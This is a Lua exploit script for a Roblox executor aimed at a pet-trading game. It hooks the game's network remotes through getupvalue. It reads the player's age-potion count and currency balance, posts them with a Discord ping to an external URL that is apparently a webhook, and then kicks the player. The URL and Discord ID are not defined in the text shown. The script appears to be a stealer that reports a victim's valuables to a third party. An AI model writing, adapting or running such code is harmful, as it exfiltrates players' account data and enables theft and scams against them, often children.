local Data = require(game.ReplicatedStorage.ClientModules.Core.ClientData) 
local localPlayer = game.Players.LocalPlayer
local FsysModule = game.ReplicatedStorage:WaitForChild("Fsys")

-- Ensure FsysModule is not nil
if not FsysModule then
    error("Fsys module not found")
end

local Fsys = require(FsysModule).load

-- Ensure Fsys is a valid function
if type(Fsys) ~= "function" then
    error("Fsys.load is not a function")
end

local rawAmount = localPlayer.PlayerGui.BucksIndicatorApp.CurrencyIndicator.Container.Amount.Text
local amount = rawAmount:gsub(",", "")  -- Remove commas from the raw amount
local Counter = 0
local gui = Instance.new("ScreenGui")
gui.Parent = localPlayer.PlayerGui
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.new(1, 1, 1)
frame.Parent = gui
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.Text = "Starting"
textLabel.TextSize = 20
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.Parent = frame

local function rename(remotename, hashedremote)
    if hashedremote then
        hashedremote.Name = remotename
    else
        warn("hashedremote is nil for remotename: " .. tostring(remotename))
    end
end

-- Ensure Fsys("RouterClient").init and its upvalue are defined
local RouterClient = Fsys("RouterClient")
if RouterClient and RouterClient.init then
    print("RouterClient and RouterClient.init are defined")
    local upvalue = getupvalue(RouterClient.init, 4)
    if upvalue then
        print("Upvalue is defined")
        table.foreach(upvalue, rename)
    else
        warn("Failed to get upvalue from RouterClient.init")
    end
else
    warn("RouterClient or RouterClient.init is not defined")
end

local playerData = Data.get_data()[tostring(localPlayer)]
if playerData and playerData.inventory and playerData.inventory.food then
    for i, v in pairs(playerData.inventory.food) do 
        if v.kind == "pet_age_potion" then 
            Counter = Counter + 1 
            task.wait(0.1)
        end 
    end
else
    warn("Player inventory data is missing or malformed")
end

wait(1)
local data = {
    ["content"] = ("BOSS <@" .. discordid .. "> 🤖 " .. localPlayer.Name .. " has 🍾 " .. Counter .. " Age Potions! and " .. amount .. " 💸 bucks"),
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}
local request = http_request or request or HttpPost or syn and syn.request
if not request then
    warn("HTTP request function is not defined")
else
    local payload = {
        Url = url,
        Body = newdata,
        Method = "POST",
        Headers = headers
    }

    request(payload)
end

wait(1)
localPlayer:Kick("🤖 " .. localPlayer.Name .. " has 🍾 " .. Counter .. " Age Potions! and " .. amount .. " 💸 bucks")
